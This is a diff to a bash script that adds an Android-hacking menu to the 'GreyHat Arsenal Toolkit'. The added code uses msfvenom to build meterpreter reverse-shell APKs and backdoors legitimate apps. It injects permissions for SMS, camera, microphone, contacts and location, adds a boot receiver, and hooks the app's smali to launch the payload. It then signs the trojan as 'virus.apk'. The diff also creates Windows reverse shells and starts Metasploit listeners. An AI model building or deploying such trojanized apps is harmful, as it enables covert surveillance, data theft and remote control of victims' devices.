@@ -197,6 +197,10 @@ prompt() {
     printf "\033[32;3m"
 }
 
+#*****************************************************************************************#
+#                                       Menu 1                                            #
+#*****************************************************************************************#
+
 # Fungsi menu dengan animasi
 menu1() {
     animate "Memuat opsi rekognisi..."
@@ -304,6 +308,11 @@ scan_vulnerability_windows10() {
             ;;
     esac
 }
+
+#*****************************************************************************************#
+#                                       Menu 2                                            #
+#*****************************************************************************************#
+
 # Menu pengujian aplikasi web
 menu2() {
     animate "Memuat alat pengujian aplikasi web..."
@@ -677,7 +686,349 @@ dos_attack_hardening() {
     esac
 }
 
+#*****************************************************************************************#
+#                                       Menu 3                                            #
+#*****************************************************************************************#
+VAR1=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
+VAR2=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # smali dir renaming
+VAR3=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Payload.smali renaming
+VAR4=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 1
+VAR5=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 2
+VAR6=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # Pakage name renaming 3
+VAR7=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'payload'
+VAR8=$(cat /dev/urandom | tr -cd 'a-z' | head -c 10) # New name for word 'metasploit'
+perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'
+echo ""
+#function name
+function payload_name()
+{
+ apk_name=$(zenity --title " Nama Payload " --text "example: trojan" --entry --entry-text "trojan" --width 300 2> /dev/null)
+}
+#function payload
+function get_payload()
+{
+  PAYLOAD=$(zenity --list --radiolist --title="GreyHatArsenal" --text "\nPilih Opsi Payload:" --column="Choose" --column="Opsi" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE --width=400 --height=400 2> /dev/null)
+}
+#function original apk
+function xyz()
+{
+ orig=$(zenity --title " Aplikasi Original " --filename=$path --file-selection --file-filter "*.apk" --text "chose the original (apk)" 2> /dev/null)
+}
+#function generate payload
+function gen_payload()
+{
+ echo "[*] Generating apk payload"
+ 
+ xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $apk_name.apk > /dev/null 2>&1
+}
+#function apktool
+function apk_decomp()
+{
+ echo "[*] Decompiling Payload APK..." 
+ xterm -T "Decompiling Payload" -e apktool d $apk_name.apk > /dev/null 2>&1
+ rm $apk_name.apk
+}
+function apk_comp()
+{
+ echo "[*] Rebuilding APK file..."
 
+ xterm -T "Rebuilding APK" -e apktool b $path/payload -o trojans.apk > /dev/null 2>&1
+ rm -r payload > /dev/null 2>&1
+}
+function apk_decomp1()
+{
+ echo "[*] Decompiling Original APK..."
+ 
+ xterm -T "Decompiling Original" -e apktool d -f -o $path/original $orig > /dev/null 2>&1
+}
+# add permission dan hook
+#
+function perms()
+{
+ printf "\n"
+ printf "\033[37;1m[\033[32;1m*\033[37;1m] menambahkan permission and hook smali\033[31;1m\n"
+ 
+ echo
+ package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
+ package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
+ tmp=$package_name
+ sed -i "5i\ $perms" $path/original/AndroidManifest.xml
+ rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
+ sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
+ cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name > /dev/null 2>&1
+ rc=$?
+ if [ $rc != 0 ];then
+  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
+  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
+  tmp=$app_name
+  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
+  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
+  amanifest="    </application>"
+  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
+  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
+ fi
+ amanifest="    </application>"
+ boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
+ sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
+ android_nam=$tmp
+}
+
+# functions hook smali
+#
+function hook_smalies()
+{
+ launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+ android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
+ android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
+ android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
+ if [ $android_name ]; then
+  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
+  printf "\033[37;1minject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
+  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+  printf "\033[37;1mbaris ke : $hook_num \n"
+  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
+  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
+  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
+ elif [ ! -e $android_activity ]; then
+  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
+  printf "\033[37;1minject Smali : $android_activity.smali" |awk -F ":/" '{ print $NF }'
+  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+  printf "\033[37;1mbaris ke : $hook_num \n"
+  printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
+  starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
+  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
+  rc=$?
+  if [ $rc != 0 ]; then
+    printf '\033[31;1m'
+    
+    printf "\033[37;1m[\033[31;1mx\033[37;1m] tidak ditemukan : $android_activity.smali\n"
+    printf "\033[37;1m[\033[32;1m*\033[37;1m] mencoba lagi . . .\033[31;1m\n"
+    
+    sleep 2
+    echo
+    printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
+    printf "\033[37;1minject Smali : $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
+    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
+    printf "\033[37;1mbaris ke : $hook_num \n"
+    printf "\033[32;1m++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n"
+    starter="   invoke-static {}, L$android_nam/stage/MainService;->start()V"
+    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
+  fi
+ fi
+}
+
+# rebuild backdoor
+function apk_comp1()
+{
+ echo "[*] Rebuilding Backdoored APK..."
+ xterm -T "Rebuilding APK" -e apktool b $path/original -o virus.apk > /dev/null 2>&1
+ rm -r payload > /dev/null 2>&1
+ rm -r original > /dev/null 2>&1
+}
+
+# sign Backdoor file manual inject
+#
+function sign_orig(){
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] sign your backdoor\033[31;1m\n"
+        java -jar $path.android/sign.jar virus.apk;mv virus.s.apk virus.apk > /dev/null 2>&1
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] signed backdoor,\033[32;1m succesfully\033[31;1m\n"
+        sleep 0.025s
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] verification your backdoor, please wait\033[31;1m\n"
+        sleep 0.025s
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] recompyle your backdoor\033[31;1m\n"
+        sleep 0.025s
+        zipalign 4 virus.apk $nama.apk > /dev/null 2>&1
+        printf "\033[37;1m[\033[32;1m*\033[37;1m] verification, \033[32;1m succesfully\033[31;1m\n"
+        sleep 3
+}
+
+# Menu hacking Android
+# Fungsi untuk menu nomor 3
+menu3() {
+    clear
+    banner
+
+    animate_menu "Menu Hacking Android"
+    animate """
+    [1]. Buat Payload Android
+    [2]. Susupi Payload Android ke Aplikasi Asli [OLD]
+    [3]  Susupi Payload Android ke Aplikasi Asli [NEW]
+    [4]. Generate Payload Windows untuk Bypass Windows 10
+    ----------------------------------------------
+    [5]. Aktifkan Listener Payload Android
+    [5]. Aktifkan Listener Payload Windows
+    [x]. Kembali
+    ----------------------------------------------
+    Interface IP:
+    eth0: $eth0_ip
+    wlan0: $wlan0_ip
+    ----------------------------------------------
+    """
+    prompt
+
+    case $user_input in
+        1) create_android_payload ;;
+        2) inject_android_payload ;;
+        3) inject_android_payload_new ;;
+        4) generate_windows_payload ;;
+        5) activate_android_listener ;;
+        6) activate_windows_listener ;;
+        x) run ;;
+        *) animate "Pilihan tidak valid. Harap coba lagi." ;;
+    esac
+}
+
+
+# Fungsi untuk membuat payload Android
+create_android_payload() {
+    clear
+    banner
+    animate_menu "Buat Payload Android"
+
+        # Meminta input dari pengguna
+        animate "Masukkan LHOST untuk payload:"
+        prompt
+        lhost="$user_input"
+
+        animate "Masukkan LPORT untuk payload:"
+        prompt
+        lport="$user_input"
+
+    # Menampilkan payload yang akan dibuat
+    payload="android/meterpreter/reverse_tcp"
+    animate "Membuat payload Android dengan LHOST=$lhost dan LPORT=$lport..."
+
+    # Membuat payload menggunakan msfvenom
+    msfvenom -p $payload LHOST=$lhost LPORT=$lport -o payload.apk
+
+    animate "Payload Android telah dibuat dengan nama payload.apk."
+    sleep 2
+    menu3
+}
+
+# Fungsi untuk menyusupkan payload Android ke aplikasi asli
+inject_android_payload() {
+    clear
+    banner
+    animate_menu "Susupi Payload Android ke Aplikasi Asli"
+     # Meminta input dari pengguna
+        animate "Masukkan LHOST untuk payload:"
+        prompt
+        lhost="$user_input"
+
+        animate "Masukkan LPORT untuk payload:"
+        prompt
+        lport="$user_input"
+
+
+    # Meminta input dari pengguna
+    animate "Masukkan path file APK asli:"
+    prompt
+    original_apk="$user_input"
+
+    # Menampilkan payload yang akan digunakan
+    payload="payload.apk"
+    animate "Menyusupkan payload Android ke $original_apk..."
+
+    # Menyusupkan payload menggunakan msfvenom
+    msfvenom -x $original_apk -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o infected.apk
+
+    animate "Payload Android telah disusupkan ke $original_apk. Hasil disimpan di infected.apk."
+    sleep 2
+    menu3
+}
+
+# Fungsi untuk menyusupkan payload Android ke aplikasi asli new
+inject_android_payload_new() {
+    clear
+    banner
+    animate_menu "Susupi Payload Android ke Aplikasi Asli"
+    # Meminta input dari pengguna
+    animate "Masukkan LHOST untuk payload:"
+    prompt
+    lhost="$user_input"
+
+    animate "Masukkan LPORT untuk payload:"
+    prompt
+    lport="$user_input"
+    # susupi
+    payload_name
+    get_payload
+    xyz
+    gen_payload
+    apk_decomp1
+    apk_decomp
+    perms
+    hook_smalies
+    apk_comp1
+    sign_orig
+
+    sleep 2
+    menu3
+}
+
+# Fungsi untuk generate payload Windows untuk bypass Windows 10
+generate_windows_payload() {
+    clear
+    banner
+    animate_menu "Generate Payload Windows untuk Bypass Windows 10"
+    # Meminta input dari pengguna
+    animate "Masukkan LHOST untuk payload:"
+    prompt
+    lhost="$user_input"
+
+    animate "Masukkan LPORT untuk payload:"
+    prompt
+    lport="$user_input"
+
+    # Menampilkan payload yang akan dibuat
+    payload="windows/x64/shell_reverse_tcp"
+    animate "Membuat payload Windows untuk bypass Windows 10 dengan LPORT=$lport..."
+
+    # Membuat payload menggunakan msfvenom
+    msfvenom -p $payload LHOST=$lhost LPORT=$lport -f python
+
+    animate "Tekan Enter.. Untuk Melanjutkan"
+    read x
+    sleep 2
+    menu3
+}
+
+# Fungsi untuk mengaktifkan listener payload Android
+activate_android_listener() {
+    clear
+    banner
+    animate_menu "Aktifkan Listener Payload Android"
+
+    # Menampilkan payload yang akan digunakan
+    payload="android/meterpreter/reverse_tcp"
+    animate "Aktifkan listener payload Android dengan LHOST=$lhost dan LPORT=$lport..."
+
+    # Memulai Metasploit dan mengaktifkan listener
+    msfconsole -q -x "use multi/handler; set payload $payload; set LHOST $lhost; set LPORT $lport; exploit"
+
+    animate "Listener payload Android telah diaktifkan."
+    sleep 2
+    menu3
+}
+
+# Fungsi untuk mengaktifkan listener payload Windows
+activate_windows_listener() {
+    clear
+    banner
+    animate_menu "Aktifkan Listener Payload Windows"
+
+    # Menampilkan payload yang akan digunakan
+    payload="windows/x64/shell_reverse_tcp"
+    animate "Aktifkan listener payload Windows dengan LHOST=$lhost dan LPORT=$windows_lport..."
+
+    # Memulai Metasploit dan mengaktifkan listener
+    msfconsole -q -x "use multi/handler; set payload $payload; set LHOST $lhost; set LPORT $windows_lport; exploit"
+
+    animate "Listener payload Windows telah diaktifkan."
+    sleep 2
+    menu3
+}
 
 
 
@@ -723,6 +1074,9 @@ animate_menu() {
 }
 
 # Animasi selamat datang
+eth0_ip=$(ifconfig eth0 | grep "inet" | awk 'NR == 1 {print $2}')
+wlan0_ip=$(ifconfig wlan0 | grep "inet" | awk 'NR == 1 {print $2}')
+clear
 sleep 1
 animate "Selamat datang di GHAT - GreyHat Arsenal Toolkit!"
 sleep 1
